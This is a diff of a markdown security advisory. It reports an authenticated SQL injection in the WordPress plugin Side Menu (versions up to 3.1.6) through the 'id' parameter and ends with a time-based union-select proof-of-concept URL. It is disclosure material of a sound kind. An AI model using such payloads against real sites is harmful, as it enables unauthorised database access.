@@ -1,14 +1,11 @@
 # Side Menu <= 3.1.6 - Authenticated SQL Injection
-
 ## Description
-    The menu update functionality of the plugin, available to Administrator users takes the id GET parameter and uses it into an SQL statement without proper sanitisation, validation or escaping, therefore leading to a SQL Injection issue.
-    
+    The menu update functionality of the plugin, available to Administrator users takes the id GET parameter and uses it into an SQL statement without proper sanitisation, validation or escaping, therefore leading to a SQL Injection issue.   
 ## Affects Plugins
     Side Menu <= 3.1.6 (the latest version at this time)
     https://wordpress.org/plugins/side-menu/
 ## Author
-    pang0lin@webray.com.cn inc
-    
+    pang0lin@webray.com.cn inc 
 ## Detail
     The issue is occured at file side-menu-lite/admin/partials/include-data.php. When the parameter $act equals to 'duplicate', the parameter id is derectly used by mysql select sql. 
 ```
@@ -46,7 +43,6 @@ if ( $act == "update" ) {
 }
 
 ```
-
 ## Proof of Concept
 http://192.168.65.26/wp/wp-admin/admin.php?page=side-menu-lite&tab=add-new&act=duplicate&id=0 union select 1,2,sleep(5)
 Visit this page, it will sleep more than 5 seconds.
